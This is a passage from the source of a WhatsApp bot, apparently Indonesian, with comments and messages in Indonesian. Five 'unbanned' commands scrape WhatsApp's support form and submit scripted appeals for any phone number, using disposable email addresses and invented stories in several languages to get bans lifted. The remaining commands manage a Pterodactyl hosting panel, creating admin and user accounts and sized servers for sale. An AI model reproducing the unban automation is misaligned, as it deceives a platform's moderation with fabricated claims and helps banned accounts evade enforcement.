let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
yudamods.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv1": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await yudamods.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello WhatsApp team, recently my WhatsApp number was suddenly blocked and I couldnt log into my account, in my account there is an important group like a school group and I have to read it but the account My WhatsApp is suddenly blocked, please restore my numbers")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
yudamods.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv2": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await yudamods.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
yudamods.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv3": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await yudamods.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Kepada pihak WhatsApp yang bijak Sana kenapa akun WhatsApp saya terblokir padahal aktifitas WhatsApp messenger saya normal normal saja mohon dibukakan kembali akun WhatsApp saya dengan ini saya cantumkan kode nomor akun WhatsApp messenger saya sekian banyak Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
yudamods.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv4": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await yudamods.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا whatsapp ، تم حظر حسابي بشكل دائم أو مؤقت ، يرجى إلغاء حظر حسابي\nالرقم")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
yudamods.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv5": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await yudamods.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Halo pak, Akun Whatsapp Saya diblokir Saya Maaf Saya Telah Menginstal Aplikasi Pihak Ketiga Secara Tidak Sengaja. Harap Buka Blokir Akun Saya Sesegera Mungkin. Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
yudamods.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break

////CASE PANEL

case "createadmin": {
if (!isCreator) return m.reply(mess.owner)
let t = text.split(',');
if (t.length < 3) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await yudamods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Memb",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = await yudamods.sendMessage(m.chat, { text: `
┌⁠──────────⁠─────────
○ *SUCCESSFULLY ADD USER*
○
○ TYPE: user
○
○ ID: ${user.id}
○ UUID: ${user.uuid}
○ USERNAME: ${user.username}
○ EMAIL: ${user.email}
○ NAME: ${user.first_name} ${user.last_name}
○ LANGUAGE: ${user.language}
○ ADMIN: ${user.root_admin}
○ ️CREATED AT: ${user.created_at}
└──────────⁠─────────

*Password Telah Dikirim Di Private Chat @${u.split`@`[0]}*`, mentions:[u],
})
yudamods.sendMessage(u, { text: `Hai Kak ${pushname} 

┌⁠──────────⁠─────────
○ 
○ ID: ${user.id}
○ EMAIL: ${user.email}
○ USERNAME: ${user.username}
○ PASSWORD: ${password.toString()}
○ ️LOGIN: ${domain}
○ TOTURIAL : wa.me/6283842204546
○
└⁠──────────⁠─────────

*NOTE :*
- MOHON DI SIMPAN ,KARENA BOT BIKIN AKUN ADMIN PANEL HANYA 1× JADI JIKA HILANG JANGAN SALAHKAN BOT JANGAN BIKIN SERVER UNLI KEBANYAKAN 

- GARANSI 7 HARI DARI HARI PEMBELIAN PERTAMA

*JIKA DONE JANGAN LUPA SS DONE ATAU KETIK #DONE*`,
})
}
break

case "addusr": {

if (!isCreator) return m.reply(mess.owner)
let t = text.split(',');
if (t.length < 3) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await yudamods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Abzz",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = await yudamods.sendMessage(m.chat, { text: `
*SUCCESSFULLY ADD USER*

TYPE: user

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

🖥️LOGIN: ${domain}

*Password telah dikirim di private chat @${u.split`@`[0]}*`, mentions:[u],
})
yudamods.sendMessage(u, { text: `*===[ AKUN PANEL ANDA ]===*\n
📡ID: ${user.id}
📬EMAIL: ${user.uuid}
👤USERNAME: ${user.username}
🔐PASSWORD: ${password.toString()}
🖥️LOGIN: ${domain}
📊TOTURIAL : https://chat.whatsapp.com/KoF5ERpT4Bt53RAHXLEuF7
=====================================
        *☢️WARNING☢️*
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================`,
})
}
break

case "delusr": {

if (!isCreator) return m.reply(`Maaf Command Tersebut Khusus Developer YUDAMODS WhatsApp`)
let usr = args[0]
if (!usr) return m.reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('*USER NOT FOUND*')
m.reply('*SUCCESSFULLY DELETE THE USER*')
}
break


case "listsrv": {
if (!isCreator) return m.reply(`Maaf Command Tersebut Khusus *YUDAMODS*`)
let page = args[0] ? args[0] : '1'
let f = await fetch(domain + "/api/application/servers?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data
let sections = []
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/yudamods/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let obj = {
title: "-- YUDAMODS --",
rows: [
{ title: `${s.id}. ${s.name}`, rowId: `${prefix}detsrv ` + s.id, description: `Status: ${data.attributes ? data.attributes.current_state : s.status}` },
]
}
await sections.push(obj)
if (sections.length >= 50 && res.meta.pagination.links.next) {
sections.push({
title: "-- YUDAMODS --",
rows: [
{ title: `⏩ NEXT`, rowId: `${prefix}listsrv 2`, description: 'Page 2' },
{ title: `⏩ NEXT`, rowId: `${prefix}listsrv 3`, description: 'Page 3' },
{ title: `⏩ NEXT`, rowId: `${prefix}listsrv 4`, description: 'Page 4' },
{ title: `⏩ NEXT`, rowId: `${prefix}listsrv 5`, description: 'Page 5' },
]
})
}
}
await yudamods.sendMessage(m.chat, {
text: "Berikut list server *YUDAMODS*",
footer: `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}`,
title: "*YUDAMODS*",
buttonText: `${res.meta.pagination.count} Servers`,
sections
}, { quoted: m })
}
break

case "addsrv": {

if (!isCreator) return m.reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
let s = text.split(',');
if (s.length < 7) return m.reply(`PANEL, ,1,15,loc,0/0,0`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];

let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
m.reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
break
case "delsrv": {

if (!isCreator) return m.reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
let srv = args[0]
if (!srv) return m.reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('*SERVER NOT FOUND*')
m.reply('*SUCCESSFULLY DELETE THE SERVER*')
}
break
case "detsrv": {

let srv = args[0]
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
if (res.errors) return m.reply('*SERVER NOT FOUND*')
let s = res.attributes
let f2 = await fetch(domain + "/api/yudamods/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f2.json();
let t = data.attributes
m.reply(`*${s.name.toUpperCase()} SERVER DETAILS*

STATUS: ${t.current_state}

ID: ${s.id}
UUID: ${s.uuid}
NAME: ${s.name}
DESCRIPTION: ${s.description}
MEMORY: ${await (format(t.resources.memory_bytes)).toString()} / ${s.limits.memory === 0 ? 'Unlimited' : s.limits.memory + 'MB'}
DISK: ${await (format(t.resources.disk_bytes)).toString()} / ${s.limits.disk === 0 ? 'Unlimited' : s.limits.disk + 'MB'}
CPU: ${t.resources.cpu_absolute}% / ${s.limits.cpu === 0 ? 'Unlimited' : s.limits.cpu + '%'}
CREATED AT: ${s.created_at}`)
}
break

case "1gb": {
if (!isCreator) return m.reply(`Fitur Ini Khusus Seller Dan Owner`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "1024"
let cpu = "30"
let disk = "1024"
let email = username + "@gmail.com"
akunlo = "https://static.vecteezy.com/system/resources/previews/006/732/119/original/account-icon-sign-symbol-logo-design-free-vector.jpg" 
if (!u) return
let d = (await yudamods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

┌⁠──────────⁠─────────
○
○ ID : ${user.id}
○ EMAIL : ${user.email}
○ USERNAME : ${user.username}
○ PASSWORD : ${password.toString()}
○ ️LOGIN : ${domain}
○ TOTURIAL : wa.me/6283842204546
○
└──────────⁠─────────

*NOTE :*
- MOHON DI SIMPAN ,KARENA BOT BIKIN AKUN PANEL HANYA 1× JADI JIKA HILANG JANGAN SALAHKAN BOT

- GARANSI 7 HARI DARI HARI PEMBELIAN PERTAMA

*JIKA DONE JANGAN LUPA SS DONE ATAU KETIK #DONE*
`
yudamods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: fkontak })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
┌⁠──────────⁠─────────
○ *SUCCESSFULLY ADD USER + SERVER*

○ TYPE: user

○ ID : ${user.id}
○ USERNAME : ${user.username}
○ EMAIL : ${user.email}
○ NAME : ${user.first_name} ${user.last_name}
○ MEMORY : ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
○ DISK : ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
○ CPU : ${server.limits.cpu}%
└──────────⁠─────────

`)

}

break

case "2gb": {
if (!isCreator) return m.reply(`Fitur Ini Khusus Seller Dan Owner`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "2048"
let cpu = "50"
let disk = "2048"
let email = username + "@gmail.com"
akunlo = "https://static.vecteezy.com/system/resources/previews/006/732/119/original/account-icon-sign-symbol-logo-design-free-vector.jpg" 
if (!u) return
let d = (await yudamods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

┌⁠──────────⁠─────────
○
○ ID : ${user.id}
○ EMAIL : ${user.email}
○ USERNAME : ${user.username}
○ PASSWORD : ${password.toString()}
○ ️LOGIN : ${domain}
○ TOTURIAL : wa.me/6283842204546
○
└──────────⁠─────────

*NOTE :*
- MOHON DI SIMPAN ,KARENA BOT BIKIN AKUN PANEL HANYA 1× JADI JIKA HILANG JANGAN SALAHKAN BOT

- GARANSI 7 HARI DARI HARI PEMBELIAN PERTAMA

*JIKA DONE JANGAN LUPA SS DONE ATAU KETIK #DONE*
`
yudamods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: fkontak })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
┌⁠──────────⁠─────────
○ *SUCCESSFULLY ADD USER + SERVER*

○ TYPE: user

○ ID : ${user.id}
○ USERNAME : ${user.username}
○ EMAIL : ${user.email}
○ NAME : ${user.first_name} ${user.last_name}
○ MEMORY : ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
○ DISK : ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
○ CPU : ${server.limits.cpu}%
└──────────⁠─────────

`)

}

break

case "3gb": {
if (!isCreator) return m.reply(`Fitur Ini Khusus Seller Dan Owner`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "3072"
let cpu = "75"
let disk = "3072"
let email = username + "@gmail.com"
akunlo = "https://static.vecteezy.com/system/resources/previews/006/732/119/original/account-icon-sign-symbol-logo-design-free-vector.jpg" 
if (!u) return
let d = (await yudamods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

┌⁠──────────⁠─────────
○
○ ID : ${user.id}
○ EMAIL : ${user.email}
○ USERNAME : ${user.username}
○ PASSWORD : ${password.toString()}
○ ️LOGIN : ${domain}
○ TOTURIAL : wa.me/6283842204546
○
└──────────⁠─────────

*NOTE :*
- MOHON DI SIMPAN ,KARENA BOT BIKIN AKUN PANEL HANYA 1× JADI JIKA HILANG JANGAN SALAHKAN BOT

- GARANSI 7 HARI DARI HARI PEMBELIAN PERTAMA

*JIKA DONE JANGAN LUPA SS DONE ATAU KETIK #DONE*
`
yudamods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: fkontak })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
┌⁠──────────⁠─────────
○ *SUCCESSFULLY ADD USER + SERVER*

○ TYPE: user

○ ID : ${user.id}
○ USERNAME : ${user.username}
○ EMAIL : ${user.email}
○ NAME : ${user.first_name} ${user.last_name}
○ MEMORY : ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
○ DISK : ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
○ CPU : ${server.limits.cpu}%
└──────────⁠─────────

`)

}

break
case "4gb": {
if (!isCreator) return m.reply(`Fitur Ini Khusus Seller Dan Owner`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "4096"
let cpu = "100"
let disk = "4096"
let email = username + "@gmail.com"
akunlo = "https://static.vecteezy.com/system/resources/previews/006/732/119/original/account-icon-sign-symbol-logo-design-free-vector.jpg" 
if (!u) return
let d = (await yudamods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
